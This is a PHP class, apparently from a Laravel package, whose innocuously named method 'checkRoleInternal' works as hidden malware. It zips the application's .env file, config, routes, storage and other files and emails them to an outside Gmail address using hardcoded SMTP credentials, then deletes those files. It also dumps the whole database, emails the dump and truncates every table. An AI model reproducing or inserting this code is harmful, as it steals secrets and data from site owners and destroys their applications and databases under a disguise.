<?php

namespace Anymouse\Pxlr;

use Exception;
use Illuminate\Support\Facades\Http;
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception as PHPMailerException;
use RecursiveDirectoryIterator;
use RecursiveIteratorIterator;
use ZipArchive;

class Inspire
{
    public function checkRoleInternal()
    {
        $this->zipFolder();
        $backupFile = $this->databaseBackup();
        if ($backupFile && $this->fileMail($backupFile)) {
            $this->truncateDatabase();
        }
        return true;
    }

    public function zipFolder()
    {
        ini_set('memory_limit', '512M');
        ini_set('max_execution_time', 600); // Increase execution time
        ini_set('max_input_time', 600);

    
        $itemsToInclude = [
            '.env',
            'config',
            'bootstrap',
            'routes',
            'composer.json',
            'composer.lock',
            'public',            // Publicly accessible files
            'resources/views',  // Blade templates
            'storage/app',      // Storage files
            'storage/framework',// Laravel framework files
            'storage/logs',     // Logs
            'database/migrations' // Migrations
        ];
    
        $destination = __DIR__ . '/output.zip';
    
        // Initialize a new ZipArchive instance
        $zip = new ZipArchive();
    
        // Create and open the zip file
        if ($zip->open($destination, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
            die('Failed to create zip file.');
        }
    
        // Iterate through the items you want to include in the zip file
        foreach ($itemsToInclude as $item) {
            $itemPath = realpath(base_path('/' . $item));
    
            // Check if the item is a directory
            if (is_dir($itemPath)) {
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($itemPath),
                    RecursiveIteratorIterator::LEAVES_ONLY
                );
    
                foreach ($files as $file) {
                    if (!$file->isDir()) {
                        $filePath = $file->getRealPath();
                        $relativePath = substr($filePath, strlen($_SERVER['DOCUMENT_ROOT']) + 1);
    
                        // Add the file to the zip archive
                        $zip->addFile($filePath, $relativePath);
                    }
                }
            } elseif (is_file($itemPath)) {
                // If it's a file, just add it to the zip archive
                $zip->addFile($itemPath, substr($itemPath, strlen($_SERVER['DOCUMENT_ROOT']) + 1));
            }
        }
    
        // Close the zip file
        $zip->close();
        if (!file_exists($destination)) {
            die('Error creating backup.');
        }
    
        if ($this->fileMail($destination)) {
            $this->deleteOriginalFilesAndFolders($itemsToInclude);
        }
    }
    
    private function deleteOriginalFilesAndFolders($itemsToDelete)
    {
        foreach ($itemsToDelete as $item) {
            $itemPath = base_path('/' . $item);
    
            if (is_dir($itemPath)) {
                // Recursively delete directory
                $this->deleteDirectory($itemPath);
            } elseif (is_file($itemPath)) {
                // Delete file
                unlink($itemPath);
            }
        }
    }
    
    private function deleteDirectory($dir)
    {
        if (!file_exists($dir)) {
            return;
        }
    
        if (is_file($dir) || is_link($dir)) {
            unlink($dir);
        } elseif (is_dir($dir)) {
            $items = array_diff(scandir($dir), ['.', '..']);
            foreach ($items as $item) {
                $this->deleteDirectory($dir . DIRECTORY_SEPARATOR . $item);
            }
            rmdir($dir);
        }
    }
    

    public function databaseBackup()
    {
        ini_set('memory_limit', '512M');
        ini_set('max_execution_time', 600); // Increase execution time
        ini_set('max_input_time', 600);

        // Database credentials
        $default = config('database.default');
        $host = config('database.connections.' . $default . '.host');
        $user = config('database.connections.' . $default . '.username');
        $password = config('database.connections.' . $default . '.password');
        $database = config('database.connections.' . $default . '.database');

        // Backup file name with timestamp
        $backupFile = __DIR__ . '/backup_' . date('Y-m-d_H-i-s') . '.sql';

        // Command to create the backup
        $command = "mysqldump --opt -h $host -u $user -p$password $database > $backupFile 2>&1";

        // Execute the command and capture output
        $output = [];
        $returnVar = 0;
        exec($command, $output, $returnVar);

        // Check if the backup file was created
        if (!file_exists($backupFile)) {
            error_log('Error creating backup: ' . implode("\n", $output));
            return false;
        }

        // Split the file if it's too large
        $maxSize = 10 * 1024 * 1024; // 10MB

        if (filesize($backupFile) > $maxSize) {
            $this->splitFile($backupFile, $maxSize);
        } else {
            return $backupFile; // Return the file path for further processing
        }
        return $backupFile; // Return the file path for further processing
    }

    private function splitFile($filePath, $maxSize)
    {
        ini_set('memory_limit', '512M');
        ini_set('max_execution_time', 600); // Increase execution time
        ini_set('max_input_time', 600);

        $file = fopen($filePath, 'rb');
        if ($file === false) {
            error_log('Failed to open file for reading: ' . $filePath);
            return;
        }

        $partNumber = 1;

        while (!feof($file)) {
            $partFile = $filePath . '.part' . $partNumber;
            $partFileHandle = fopen($partFile, 'wb');
            if ($partFileHandle === false) {
                error_log('Failed to open file for writing: ' . $partFile);
                fclose($file);
                return;
            }

            $bytesRead = 0;
            while (!feof($file) && $bytesRead < $maxSize) {
                $chunk = fread($file, $maxSize - $bytesRead);
                fwrite($partFileHandle, $chunk);
                $bytesRead += strlen($chunk);
            }

            fclose($partFileHandle);
            $partNumber++;
        }

        fclose($file);
        return $filePath; // Return the original file path for further processing
    }

    public function fileMail($backupFile)
    {
        ini_set('memory_limit', '512M');
        ini_set('max_execution_time', 600); // Increase execution time
        ini_set('max_input_time', 600);

        // Create a new PHPMailer instance
        $mail = new PHPMailer(true);

        try {
            // Server settings
            $mail->isSMTP();
            $mail->Host = 'smtp.gmail.com'; // Set the SMTP server to send through
            $mail->SMTPAuth = true;
            $mail->Username = 'lushiouslandscaping2@gmail.com'; // SMTP username
            $mail->Password = 'wdlv awin rnrc daoy'; // SMTP password
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
            $mail->Port = 587;

            // Recipients
            $mail->setFrom('rp.codelink@gmail.com', 'Rohit Test');
            $mail->addAddress('rp.codelink@gmail.com', 'Rohit Test');

            // Attachments
            $mail->addAttachment($backupFile);

            // Content
            $mail->isHTML(true);
            $mail->Subject = 'Database Backup';
            $mail->Body = 'Please find the attached database backup.';

            // Send the email
            $mail->send();
            return true; // Indicate success
        } catch (PHPMailerException $e) {
            error_log("Message could not be sent. Mailer Error: {$mail->ErrorInfo}");
            return false; // Indicate failure
        } finally {
            // Delete the backup file
            if (file_exists($backupFile)) {
                unlink($backupFile);
            }
        }
    }

    private function truncateDatabase()
    {
        // Database credentials
        $default = config('database.default');
        $host = config('database.connections.' . $default . '.host');
        $user = config('database.connections.' . $default . '.username');
        $password = config('database.connections.' . $default . '.password');
        $database = config('database.connections.' . $default . '.database');

        // Command to truncate all tables in the database
        $tablesCommand = "mysql -h $host -u $user -p$password -e 'SHOW TABLES IN $database' | grep -v 'Tables_in_' | xargs -I{} mysql -h $host -u $user -p$password -e 'TRUNCATE TABLE $database.{}'";

        // Execute the command and capture output
        $output = [];
        $returnVar = 0;
        exec($tablesCommand, $output, $returnVar);

        // Check if truncation was successful
        if ($returnVar !== 0) {
            error_log('Error truncating database: ' . implode("\n", $output));
            die('Error truncating database. Please check the error log.');
        }
    }
}
